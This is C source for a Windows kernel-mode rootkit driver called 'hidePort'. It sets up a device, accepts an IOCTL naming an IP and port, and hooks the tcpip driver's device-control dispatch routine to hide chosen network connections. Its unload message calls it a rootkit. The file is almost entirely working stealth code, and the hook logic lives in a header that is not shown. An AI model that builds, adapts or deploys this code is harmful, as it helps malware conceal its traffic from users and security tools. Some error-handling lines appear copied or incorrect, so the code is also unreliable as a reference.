#include<string.h>
#include"TCPHook.h"

#define DRIVER_NAME      L"hidePort"
#define NT_DEVICE_NAME    L"\\Device\\HIDEPORT"
#define DOS_DEVICE_NAME    L"\\DosDevices\\"DRIVER_NAME

#define IOCTL_HIDE_PORT \
    CTL_CODE( FILE_DEVICE_UNKNOWN, 0x910, METHOD_BUFFERED, FILE_ANY_ACCESS)

void DriverUnload(PDRIVER_OBJECT DriverObject) {

	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
	UNICODE_STRING uniWin32NameString;

	if (g_InBuff != NULL) {
		ExFreePool(g_InBuff);
		g_InBuff = NULL;
	}

	if (OldIrpMjDeviceControl!=NULL)
	{
		InterlockedExchange64((PLONG64)(&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL]), (LONG64)OldIrpMjDeviceControl);
	}
	if (pFile_tcp != NULL)
	{
		ObDereferenceObject(pFile_tcp);
	}
	pFile_tcp = NULL;
	DbgPrint("Rootkits Unload \n");

	RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);
	IoDeleteSymbolicLink(&uniWin32NameString);

	if (deviceObject != NULL) {
		IoDeleteDevice(deviceObject);
	}
}

NTSTATUS Create(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	PIO_STACK_LOCATION  stack = NULL;

	UNREFERENCED_PARAMETER(DeviceObject);

	stack = IoGetCurrentIrpStackLocation(Irp);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS Close(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	PIO_STACK_LOCATION  stack = NULL;

	UNREFERENCED_PARAMETER(DeviceObject);

	stack = IoGetCurrentIrpStackLocation(Irp);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	PIO_STACK_LOCATION  stack = NULL;
	NTSTATUS            status = STATUS_SUCCESS;
	ULONG               inBuffLen = 0;
	ULONG               outBuffLen = 0;
	PVOID               pInBuff = NULL;
	PVOID               pOutBuff = NULL;

	UNREFERENCED_PARAMETER(DeviceObject);

	stack = IoGetCurrentIrpStackLocation(Irp);
	inBuffLen = stack->Parameters.DeviceIoControl.InputBufferLength;
	outBuffLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
	pInBuff = Irp->AssociatedIrp.SystemBuffer;
	pOutBuff = Irp->AssociatedIrp.SystemBuffer;
	Irp->IoStatus.Information = 0;

	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_HIDE_PORT: 
	{
		g_InBuff = ExAllocatePool(NonPagedPool, inBuffLen);
		if (g_InBuff==NULL)
		{
			DbgPrint("g_InBuff is NULL!");
			break;
		}
		else {

			RtlZeroMemory(g_InBuff, inBuffLen);
			strncpy_s(g_InBuff, inBuffLen, pInBuff, _TRUNCATE);

			status = GetIPAndPort();
			if (!NT_SUCCESS(status)) {
				DbgPrint("GetIPAndPort failed!");
				break;
			}

			status = InstallTCPHook();
			if (!NT_SUCCESS(status)) {
				DbgPrint("InstallTCPHook failed!");
				break;
			}
			break;
		}
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		DbgPrint("unknow ioctl: %u", stack->Parameters.DeviceIoControl.IoControlCode);
		break;
	}

	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath) {

	NTSTATUS status;
	g_InBuff = NULL;
	UNICODE_STRING  ntUnicodeString;
	UNICODE_STRING  ntWin32NameString;
	PDEVICE_OBJECT  deviceObject = NULL;


	UNREFERENCED_PARAMETER(RegistryPath);
	RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);

	status = IoCreateDevice(DriverObject,
		0,
		&ntUnicodeString,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		TRUE,
		&deviceObject);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Couldn't create the device object\n");
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = Create;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = Close;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
	DriverObject->DriverUnload = DriverUnload;

	RtlInitUnicodeString(&ntWin32NameString, DOS_DEVICE_NAME);
	IoDeleteSymbolicLink(&ntWin32NameString);
	status = IoCreateSymbolicLink(&ntWin32NameString, &ntUnicodeString);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Couldn't create symbolic link\n");
		IoDeleteDevice(deviceObject);
		return status;
	}

	status = InstallTCPHook();
	if (!NT_SUCCESS(status)) {
		DbgPrint("Couldn't create symbolic link\n");
		IoDeleteSymbolicLink(&ntWin32NameString);
		IoDeleteDevice(deviceObject);
		return status;
	}

	return status;
}




